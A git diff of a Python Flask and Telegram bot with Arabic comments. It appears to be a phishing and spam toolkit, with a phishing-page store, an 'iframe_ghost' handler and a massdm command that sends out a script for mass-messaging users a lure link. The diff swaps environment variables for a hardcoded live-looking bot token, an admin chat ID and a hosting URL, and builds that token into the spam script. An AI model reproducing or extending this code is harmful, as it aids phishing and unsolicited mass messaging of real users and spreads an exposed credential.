@@ -7,11 +7,15 @@ from threading import Thread
 from telegram import Update, InputFile
 from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
 
-app = Flask(__name__)
-BOT_TOKEN = os.environ["BOT_TOKEN"]
+# ========== القيم المدمجة ==========
+BOT_TOKEN = "8511885419:AAHi0yNNaA1IVDtulFZBokSb9l_KbXaQe38"
+ADMIN_CHAT = "6829017835"  # معرف دردشتك الرقمي
+RENDER_URL = "https://goldengeneral.onrender.com"  # رابط Render العام (بدون / في النهاية)
+# ====================================
+
 TELEGRAM_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"
-ADMIN_CHAT = os.environ.get("ADMIN_CHAT", "0")
-RENDER_URL = os.environ.get("RENDER_EXTERNAL_URL", "http://localhost:10000")
+
+app = Flask(__name__)
 
 # تخزين مؤقت
 phish_pages = {}
@@ -166,13 +170,13 @@ async def qr_gen(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_photo(photo=InputFile(img_path), caption=f"رابط الصورة: {RENDER_URL}/qr/{qr_id}")
 
 async def massdm(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    script = '''# Mass DM Script
+    script = f'''# Mass DM Script
 import requests
-API_TOKEN = "YOUR_BOT_TOKEN"
+API_TOKEN = "{BOT_TOKEN}"
 target_message = "شاهد هذا: YOUR_LINK"
 users = ["user1", "user2"]
 for user in users:
-    requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", json={"chat_id": user, "text": target_message})'''
+    requests.post(f"https://api.telegram.org/bot{{API_TOKEN}}/sendMessage", json={{"chat_id": user, "text": target_message}})'''
     await update.message.reply_text(f"سكريبت الإرسال الجماعي:\n```python\n{script}\n```", parse_mode="Markdown")
 
 async def iframe_ghost(update: Update, context: ContextTypes.DEFAULT_TYPE):
